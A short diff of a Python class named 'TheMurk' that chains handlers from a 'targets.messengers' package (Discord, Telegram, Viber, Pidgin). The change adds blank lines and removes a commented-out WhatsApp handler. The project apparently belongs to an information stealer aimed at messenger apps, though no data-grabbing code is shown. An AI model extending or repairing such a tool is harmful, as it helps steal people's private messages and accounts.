@@ -15,6 +15,8 @@ from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
 from targets.messengers.pidgin import Pidgin
 
+
+
 class TheMurk:
     def __init__(self) -> None:
         self.MainVars()
@@ -64,5 +66,4 @@ class TheMurk:
         self.msgOther = Discord(self.msgOther)
         self.msgOther = Telegram(self.msgOther)
         self.msgOther = Viber(self.msgOther)
-        #self.msgOther = whatsapp.WhatsApp(self.msgOther)
         self.msgOther = Pidgin(self.msgOther)
